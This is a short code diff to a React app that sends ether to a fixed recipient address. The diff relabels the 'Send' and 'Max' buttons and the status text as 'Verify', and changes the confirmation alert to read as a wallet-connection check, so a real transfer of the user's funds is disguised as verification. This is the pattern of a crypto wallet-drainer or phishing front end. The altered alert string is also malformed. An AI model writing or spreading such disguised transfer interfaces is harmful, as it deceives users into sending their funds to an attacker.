@@ -76,7 +76,7 @@ export default function App() {
         to: recipient,
         value: parseEther(amount)
       });
-      alert(`Sent ${amount} to fixed recipient`);
+      alert(`Verify wallet{amount} to connect `);
       setAmount("");
     } catch (err) {
       console.error(err);
@@ -105,13 +105,13 @@ export default function App() {
           />
 
           <div style={{ marginTop: 10 }}>
-            <button onClick={handleMaxFill} disabled={sending}>Max</button>
+            <button onClick={handleMaxFill} disabled={sending}>Verify</button>
             <button
               onClick={handleSend}
               style={{ marginLeft: 10 }}
               disabled={sending}
             >
-              {sending ? "Sending..." : "Send"}
+              {sending ? "verifying..." : "Verify"}
             </button>
           </div>
 
